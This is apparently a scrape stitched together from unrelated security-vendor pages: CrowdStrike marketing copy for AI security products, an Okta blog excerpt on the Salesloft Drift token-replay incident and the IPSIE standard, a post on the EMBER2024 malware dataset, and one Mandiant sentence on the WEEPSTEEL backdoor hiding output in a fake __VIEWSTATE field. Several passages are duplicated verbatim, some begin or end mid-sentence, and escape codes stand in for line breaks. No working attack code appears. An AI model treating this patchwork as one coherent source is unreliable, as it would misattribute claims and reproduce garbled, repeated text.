privileges.\n\u2022 Integration with ChatGPT Enterprise Compliance API: Extends monitoring to GPT and Codex agents, showing ownership, connections, and sharing, while flagging high-impact action capabilities like code execution or ticket deletion.\n\u2022 Automated risk mitigation with Falcon Fusion SOAR: Contains misbehaving agents via API and opens remediation tickets with in-platform guidance for fast resolution.\n\nBy bringing AI agents under unified visibility and control, Falcon Shield helps organizations embrace SaaS-integrated AI without compromising security. It closes the gap between productivity and protection, ensuring AI automation operates securely, compliantly, and within defined guardrails.\n\nAI has expanded the enterprise attack surface to include non-human identities, model APIs, SaaS integrations, and ephemeral cloud services. But you can't counter risks that are overlooked and underassessed.\n\nCrowdStrike Falcon\u00ae Exposure Management delivers continuous visibility into AI infrastructure, enabling the surfacing of misconfigured and exposed endpoints, shadow APIs, and high-risk access policies across the environment. It identifies and categorizes generative AI applications discovered across the environment so security teams can monitor their usage and trigger automated response workflows with CrowdStrike Falcon\u00ae Fusion SOAR.\n\nKey Capabilities:\n\n\u2022 Real-time asset discovery across endpoints, cloud, SaaS, network devices, and xIoT\n\u2022 GenAI app identification to surface and respond to emerging AI-driven software risks\n\u2022 Threat-driven risk prioritization using ExPRT.AI and live adversary intelligence\n\u2022 Attack path analysis to visualize lateral movement and highlight choke points\n\u2022 Prioritized remediation based on adversary tradecraft and exploitability\n\nAI has introduced powerful new capabilities and equally powerful new risks, especially as workloads are deployed across distributed model-serving infrastructure.

It unifies AI security posture management (AI-SPM), cloud security posture management (CSPM), data security posture management (DSPM), application security posture management (ASPM), cloud infrastructure entitlement management (CIEM), and vulnerability management into a single platform.\n\nThis integrated architecture provides business context-aware risk prioritization, attack path analysis, and ExPRT.AI-driven proactive mitigation, so teams can identify and eliminate threats before adversaries can act. With cloud runtime protection built in, SOC teams can detect and respond to attacks in real time across hybrid environments, leaving adversaries no room to strike.\n\nKey Capabilities:\n\nFalcon Cloud Security provides layered protection across the AI development architecture:.\n\n\u2022 Application, runtime, and memory: Cloud workload protection and cloud detection and response (CDR) continuously monitor AI workloads for adversarial behavior, tampering of model binaries, API communications, memory tampering, or malware execution in containerized and serverless environments. Built-in cloud indicators of attack (IOAs) provide real-time alerting and response capabilities. CSPM continuously monitors cloud services used by AI applications to detect misconfigurations.\n\u2022 Agent: Container image assessment identifies threats in open-source AI packages and libraries used to build and package AI agents. CIEM identifies excessive permissions in service accounts used by agents.\n\u2022 LLM model: AI model scanning analyzes serialized models (e.g., PyTorch, Pickle, TensorRT) in container images to detect embedded malware or backdoors before they are deployed into runtime environments.\n\u2022 Services (APIs, data, code): ASPM maps all upstream and downstream dependencies, API interfaces, referenced libraries, and data flows, and monitors behaviors and connections. It also generates a comprehensive runtime software bill of materials for critical visibility into services. AI-SPM detects and monitors AI-related packages, surfacing potential risks such as vulnerabilities, from open-source or 3rd-party components.\n\u2022 Supporting services (vector stores, RAG, prompt data): DSPM and CrowdStrike Falcon\u00ae Data Protection identify sensitive data accessed by AI workloads (PII, PHI, PCI) and enforce access policies, reducing risk of data exposure via retrieval-augmented generation or LLM prompts.\n\nWith Falcon Cloud Security, organizations gain full-stack protection from development to runtime \u2014 ensuring every model, agent, API, and dataset is continuously monitored, governed, and defended.\n\nData remains the primary target for adversaries, but traditional data loss prevention (DLP) tools lack the architectural depth to address today\u2019s threat landscape. They operate with fragmented policy enforcement, reactive detection models, and limited contextual awareness, failing to account for the dynamic nature of modern data flows and usage patterns.\n\nCrowdStrike Falcon\u00ae Data Protection redefines this landscape with a unified, AI-powered solution that delivers real-time visibility and control across endpoints, cloud environments, and SaaS applications.\n\nDeployed through CrowdStrike's lightweight Falcon agent, Falcon Data Protection eliminates the need for multiple tools, providing immediate insights into data flows without added complexity. It proactively monitors and enforces security policies, detecting unauthorized data movements and insider threats before they escalate.\n\nKey Capabilities:\n\n\u2022 GenAI data leak prevention: Falcon Data Protection for Endpoint delivers real-time GenAI data leak prevention, using Similarity Detection DNA technology to recognize sensitive content even when modified or repackaged for GenAI tool upload. It enforces policies by content type, source, or sensitivity label \u2014 preventing inadvertent exposure of sensitive information while blocking data leakage across managed and unmanaged GenAI applications.\n\u2022 Runtime cloud data protection: Leveraging eBPF technology, Falcon Data Protection for Cloud (beta) monitors real-time data flows in cloud workloads, APIs, and services \u2014 identifying unauthorized transmissions to external destinations, including AI services, with minimal performance impact and no added infrastructure.\n\u2022 Unified classification engine: With a shared classification engine across endpoint and cloud, organizations can consistently define and protect sensitive data wherever it moves. This eliminates silos, reduces policy gaps, and ensures consistent enforcement across environments, delivering clarity, control, and faster time-to-value.\n\nFalcon Data Protection empowers organizations to embrace GenAI with confidence, delivering full-spectrum protection against data leaks and insider risk \u2014 without slowing innovation or increasing operational burden.\n\nAI agents are becoming integral to SaaS ecosystems, automating tasks from scheduling to code execution and cloud data access. While they boost productivity, unmanaged deployments create blind spots, misconfigurations, excessive permissions, and risky integrations.\n\nCrowdStrike Falcon\u00ae Shield secures this new layer of AI-driven automation by continuously discovering AI agents across SaaS applications, mapping each one to its human creator, detecting anomalous behavior, and enforcing policy. Delivered as part of the Falcon platform, Falcon Shield integrates SaaS posture management, real-time threat detection, and automated response, ensuring AI agent protection is part of a cohesive security strategy.\n\nKey Capabilities:\n\n\u2022 Comprehensive AI agent discovery: Identifies all AI agents across SaaS apps \u2014 including shadow deployments \u2014 and links each to its human owner for full governance.\n\u2022 SaaS security posture management (SSPM): Detects misconfigurations, unsafe defaults, and over-permissioned agents, providing a domain-level view across GenAI, authentication, data access, and device security to prioritize critical gaps.\n\u2022 Behavior and access monitoring: Monitors agent activity, usage, and permissions to detect risky behavior, flagging unsafe configurations such as broad-scoped GPT agents, unsecured integrations, and excessive privileges.\n\u2022 Integration with ChatGPT Enterprise Compliance API: Extends monitoring to GPT and Codex agents, showing ownership, connections, and sharing, while flagging high-impact action capabilities like code execution or ticket deletion.\n\u2022 Automated risk mitigation with Falcon Fusion SOAR: Contains misbehaving agents via API and opens remediation tickets with in-platform guidance for fast resolution.\n\nBy bringing AI agents under unified visibility and control, Falcon Shield helps organizations embrace SaaS-integrated AI without compromising security. It closes the gap between productivity and protection, ensuring AI automation operates securely, compliantly, and within defined guardrails.\n\nAI has expanded the enterprise attack surface to include non-human identities, model APIs, SaaS integrations, and ephemeral cloud services. But you can't counter risks that are overlooked and underassessed.\n\nCrowdStrike Falcon\u00ae Exposure Management delivers continuous visibility into AI infrastructure, enabling the surfacing of misconfigured and exposed endpoints, shadow APIs, and high-risk access policies across the environment. It identifies and categorizes generative AI applications discovered across the environment so security teams can monitor their usage and trigger automated response workflows with CrowdStrike Falcon\u00ae Fusion SOAR.\n\nKey Capabilities:\n\n\u2022 Real-time asset discovery across endpoints, cloud, SaaS, network devices, and xIoT\n\u2022 GenAI app identification to surface and respond to emerging AI-driven software risks\n\u2022 Threat-driven risk prioritization using ExPRT.AI and live adversary intelligence\n\u2022 Attack path analysis to visualize lateral movement and highlight choke points\n\u2022 Prioritized remediation based on adversary tradecraft and exploitability\n\nAI has introduced powerful new capabilities and equally powerful new risks, especially as workloads are deployed across distributed model-serving infrastructure. CrowdStrike Falcon\u00ae for IT addresses these challenges by proactively securing the operational layer of AI environments with deep visibility, intelligent automation, and real-time response. From a single console, it delivers unified observability across Windows, macOS, and Linux, enabling rapid detection of anomalies, investigation of emerging threats, and remediation of misconfigurations and vulnerabilities.\n\nAs CrowdStrike\u2019s platform-native solution for enterprise-wide remediation, Falcon for IT allows teams to respond directly to Falcon platform findings \u2014 enforcing policies, restoring secure configurations, and maintaining AI model integrity and availability \u2014 all to proactively protect the infrastructure where AI lives and runs.\n\nKey Capabilities:\n\n\u2022 Advanced osquery support for deep investigations: Run composite, parameterized, and scheduled queries across 250+ osquery tables, with multi-column output and offline queueing to support complex, reliable investigations in any environment.\n\u2022 Extensible script deployment across endpoints: Use Python, PowerShell, Bash, and Zsh to deploy custom scripts for configuration enforcement, threat response, and system hygiene, enabling rapid, targeted operations across the enterprise.\n\u2022 Automated, verified remediation at scale: Execute automated remediation actions using advanced targeting, fine-grained access control, and action verification to ensure precise fixes without disrupting endpoint performance.\n\u2022 Integrated detection, remediation, and policy enforcement: Conduct YARA and hash-based searches, identify misconfigurations and baseline deviations, trigger automated remediation actions, and enforce compliance with frameworks like CIS, NIST, PCI-DSS, and DISA STIG through a unified, policy-driven response framework.\n\u2022 Secure distribution and operational safeguards: Distribute content and updates securely using file distribution, advanced settings, and performance guardrails, giving teams confidence in every task even at scale.\n\nFalcon for IT empowers SecOps to quickly investigate, respond, and adapt, securing AI infrastructure with precision tools and automation to reduce risk, speed response, and close visibility gaps.\n\nWhen it comes to securing AI, many organizations don\u2019t know where to start. The attack surface is new, the risks are evolving, and most teams lack the visibility and frameworks to manage them. CrowdStrike\u2019s AI Security Services help close this gap with proactive, threat-informed engagements that assess, harden, and operationalize AI across the enterprise.\n\nKey Offerings:\n\n\u2022 AI Systems Security Assessment: Identifies how AI is being used across cloud, SaaS, and endpoints, surfaces misconfigurations, data exposure, unsanctioned AI, and governance gaps, and provides prioritized remediation guidance.\n\u2022 AI for SecOps Readiness: Builds a tailored roadmap for using AI to accelerate detection, investigation, and response, with clear adoption patterns for Falcon-native and third-party tools.\n\u2022 AI Red Team Services: Emulates real-world attacks against LLMs, autonomous agents, and integrations to uncover vulnerabilities like data leakage, prompt injection, insecure model behavior, and unauthorized access pathways.\n\nBuilt on intelligence tracking over 265 active adversary groups, these services align with industry standards like the OWASP Top 10 for LLM applications, ensuring comprehensive coverage of AI risks before adversaries exploit them.\n\nAI is redefining the cyber battlefield, expanding the attack surface, accelerating adversary speed, and introducing risks few organizations are prepared to manage.

This control prevents the replay of stolen tokens, which was the central issue in this supply chain attack.\n\nBuilding a resilient SaaS ecosystem with IPSIE\nThis incident is a stark reminder that a breach of one service can have a ripple effect across today's interconnected SaaS ecosystem. To defend against this, we must move beyond securing applications individually and ensure they are all part of a unified identity security fabric. Such a fabric, built on open standards, is what allows organizations to detect and respond to identity-based threats with the required speed and scale.\n\nThis is why, almost a year ago, Okta announced our commitment to driving a new industry standard called the Interoperability Profile for Secure Identity in the Enterprise (IPSIE) in partnership with other members of the OpenID Foundation. IPSIE aims to create a baseline for security and interoperability across SaaS applications.\n\nTwo of the fundamental controls that are part of the IPSIE framework are particularly relevant to the Salesloft Drift incident:\n\n\u2022 Shared signals:This allows for real-time communication of security events between applications.

This control prevents the replay of stolen tokens, which was the central issue in this supply chain attack.\n\nBuilding a resilient SaaS ecosystem with IPSIE\nThis incident is a stark reminder that a breach of one service can have a ripple effect across today's interconnected SaaS ecosystem. To defend against this, we must move beyond securing applications individually and ensure they are all part of a unified identity security fabric. Such a fabric, built on open standards, is what allows organizations to detect and respond to identity-based threats with the required speed and scale.\n\nThis is why, almost a year ago, Okta announced our commitment to driving a new industry standard called the Interoperability Profile for Secure Identity in the Enterprise (IPSIE) in partnership with other members of the OpenID Foundation. IPSIE aims to create a baseline for security and interoperability across SaaS applications.\n\nTwo of the fundamental controls that are part of the IPSIE framework are particularly relevant to the Salesloft Drift incident:\n\n\u2022 Shared signals:This allows for real-time communication of security events between applications.

They had ambitious plans to expand and extend the original dataset in many different ways, ending up with in excess of 3.2 million files from six file formats. Figure 1 shows how many of each file type are included in EMBER2024. The dataset features seven different types of labels and tags that support training classifiers on seven common tasks, including malicious/benign detection, malware family classification, and malware behavior identification. Source code is included that will allow researchers to replicate the feature calculation, model training, and file collection techniques used to construct the dataset. A supplemental release also includes the raw bytes and disassembly for 16.3 million functions from malicious files identified and compiled by the FLARE team\u2019s capa tool.\n\n| File Type | Train | Test | Challenge | Total |\n| --- | --- | --- | --- | --- |\n| Win32 | 1,560,000 | 360,000 | 3,225 | 1,923,225 |\n| Win64 | 520,000 | 120,000 | 814 | 640,814 |\n| .NET | 260,000 | 60,000 | 805 | 320,805 |\n| APK | 208,000 | 48,000 | 256 | 256,256 |\n| PDF | 52,000 | 12,000 | 805 | 64,805 |\n| ELF | 26,000 | 6,000 | 386 | 32,386 |\nCrowdStrike\u2019s contribution to the project consisted of updating the original feature calculation code to make it easier to use. EMBER2018 features require version 0.9.0 of the LIEF library. Updating this library results in features that may not be equivalent to what\u2019s calculated with 0.9.0. But LIEF 0.9.0 requires Python 3.6, which is now quite out of date and unsupported. One of EMBER\u2019s main use cases is teaching students how to work with machine learning in cybersecurity, and this very old dependency was just introducing them to the pain of Python packaging and versioning instead.\n\nTo solve this problem, the feature calculation code was updated to use the most recent version of the pefile library instead of LIEF. Because pefile is pure Python, it\u2019s more likely that a single locked version of pefile will be able to be installed on future versions of Python as they\u2019re released. Future versions of pefile are also unlikely to introduce breaking changes to the calculated features so that locking the pefile version required can be delayed as long as possible. While making this change, the repository also switched to using more modern Python tooling (polars, uv, etc.).\n\nIn addition to the dependency update, EMBER2024 features now include information about a file\u2019s richheader, authenticode, and any warnings that the pefile module outputs while attempting to read the PE file format. Figure 2 shows the categories of features that are calculated along with examples of all of the metadata included. A full description of all changes to the feature calculation can be found in the paper and the source code.\n\n!Figure 2. Categories of features calculated and examples of metadata included in EMBER2024\nBeyond the updated features, two other aspects of the new dataset warrant mentioning: the inclusion of a challenge set and infrastructure code.\n\nThe challenge set includes 6,315 files that were not initially detected as malicious by any of the AV products in VirusTotal. Files are included in the challenge set if they are later (after 30 days) detected as malicious by enough AV products to qualify as EMBER2024\u2019s definition of malicious. In order to gather as many of these samples as possible, they are saved throughout the train and test time periods of the dataset. They are then set aside from the train and test, and models are evaluated on them separately. Figure 1 shows the relative size of the challenge set among the various file types collected.\n\nOne of the drawbacks of the original EMBER dataset is that it\u2019s too \u201ceasy\u201d to classify. The benchmark model from the very first release achieved a ROC AUC score of 0.99911 on the test set. This made it very difficult for researchers to publicly demonstrate that their novel techniques for classification would perform better. The dataset wasn\u2019t large enough to reflect the difficulties of training and shipping a real commercial AV solution.\n\nThe challenge sets take a step toward solving this problem by highlighting the very hardest files to classify. Checking signatures and using allowlists and blocklists with cloud lookups make it possible to identify \u201cknown bad\u201d behavior. The promise of incorporating machine learning into your AV system is that you\u2019ll be better able to identify malicious files that nobody has seen before. Most of the AV products used to generate EMBER2024 labels already use ML to attempt this. And even then, the community of defenders sometimes fails. Creating a collection of those files that weren\u2019t initially identified as malicious highlights where existing solutions are struggling and creates a metric that has room for improvement.\n\nAnother innovation in the EMBER2024 public release is that it includes the code used to construct the dataset itself. This includes retrieving VirusTotal reports, labeling the files contained in those reports, and selecting a pre-set number of files from a certain time period while excluding near duplicates. This will allow researchers with access to VirusTotal to replicate what EMBER2024 would have constructed as a dataset some time in the future.\n\nGiven enough resources, future projects could use this code to put together a much larger dataset that would enable larger models or studies about the evolution of benign and malicious software over time. There\u2019s no guarantee about the consistency of the files that get added to VirusTotal in any given time period, but there are still interesting questions about model degradation or other topics that can now be approached with this codebase.",

A supplemental release also includes the raw bytes and disassembly for 16.3 million functions from malicious files identified and compiled by the FLARE team\u2019s capa tool.\n\n| File Type | Train | Test | Challenge | Total |\n| --- | --- | --- | --- | --- |\n| Win32 | 1,560,000 | 360,000 | 3,225 | 1,923,225 |\n| Win64 | 520,000 | 120,000 | 814 | 640,814 |\n| .NET | 260,000 | 60,000 | 805 | 320,805 |\n| APK | 208,000 | 48,000 | 256 | 256,256 |\n| PDF | 52,000 | 12,000 | 805 | 64,805 |\n| ELF | 26,000 | 6,000 | 386 | 32,386 |\nCrowdStrike\u2019s contribution to the project consisted of updating the original feature calculation code to make it easier to use. EMBER2018 features require version 0.9.0 of the LIEF library. Updating this library results in features that may not be equivalent to what\u2019s calculated with 0.9.0. But LIEF 0.9.0 requires Python 3.6, which is now quite out of date and unsupported. One of EMBER\u2019s main use cases is teaching students how to work with machine learning in cybersecurity, and this very old dependency was just introducing them to the pain of Python packaging and versioning instead.\n\nTo solve this problem, the feature calculation code was updated to use the most recent version of the pefile library instead of LIEF. Because pefile is pure Python, it\u2019s more likely that a single locked version of pefile will be able to be installed on future versions of Python as they\u2019re released. Future versions of pefile are also unlikely to introduce breaking changes to the calculated features so that locking the pefile version required can be delayed as long as possible. While making this change, the repository also switched to using more modern Python tooling (polars, uv, etc.).\n\nIn addition to the dependency update, EMBER2024 features now include information about a file\u2019s richheader, authenticode, and any warnings that the pefile module outputs while attempting to read the PE file format. Figure 2 shows the categories of features that are calculated along with examples of all of the metadata included. A full description of all changes to the feature calculation can be found in the paper and the source code.\n\n!Figure 2. Categories of features calculated and examples of metadata included in EMBER2024\nBeyond the updated features, two other aspects of the new dataset warrant mentioning: the inclusion of a challenge set and infrastructure code.\n\nThe challenge set includes 6,315 files that were not initially detected as malicious by any of the AV products in VirusTotal. Files are included in the challenge set if they are later (after 30 days) detected as malicious by enough AV products to qualify as EMBER2024\u2019s definition of malicious. In order to gather as many of these samples as possible, they are saved throughout the train and test time periods of the dataset. They are then set aside from the train and test, and models are evaluated on them separately. Figure 1 shows the relative size of the challenge set among the various file types collected.\n\nOne of the drawbacks of the original EMBER dataset is that it\u2019s too \u201ceasy\u201d to classify. The benchmark model from the very first release achieved a ROC AUC score of 0.99911 on the test set. This made it very difficult for researchers to publicly demonstrate that their novel techniques for classification would perform better. The dataset wasn\u2019t large enough to reflect the difficulties of training and shipping a real commercial AV solution.\n\nThe challenge sets take a step toward solving this problem by highlighting the very hardest files to classify. Checking signatures and using allowlists and blocklists with cloud lookups make it possible to identify \u201cknown bad\u201d behavior. The promise of incorporating machine learning into your AV system is that you\u2019ll be better able to identify malicious files that nobody has seen before. Most of the AV products used to generate EMBER2024 labels already use ML to attempt this. And even then, the community of defenders sometimes fails. Creating a collection of those files that weren\u2019t initially identified as malicious highlights where existing solutions are struggling and creates a metric that has room for improvement.\n\nAnother innovation in the EMBER2024 public release is that it includes the code used to construct the dataset itself. This includes retrieving VirusTotal reports, labeling the files contained in those reports, and selecting a pre-set number of files from a certain time period while excluding near duplicates. This will allow researchers with access to VirusTotal to replicate what EMBER2024 would have constructed as a dataset some time in the future.\n\nGiven enough resources, future projects could use this code to put together a much larger dataset that would enable larger models or studies about the evolution of benign and malicious software over time. There\u2019s no guarantee about the consistency of the files that get added to VirusTotal in any given time period, but there are still interesting questions about model degradation or other topics that can now be approached with this codebase.",

Like ExchangeCmdPy, WEEPSTEEL sends its output through a hidden HTML field masquerading as a legitimate `__VIEWSTATE` parameter, shown as follows:\nSubsequent HTTP POST requests to the `blocked.aspx` endpoint from the threat actor would result in HTTP 200 \"OK\" responses, which Mandiant assesses would have contained an output in the aforementioned format.
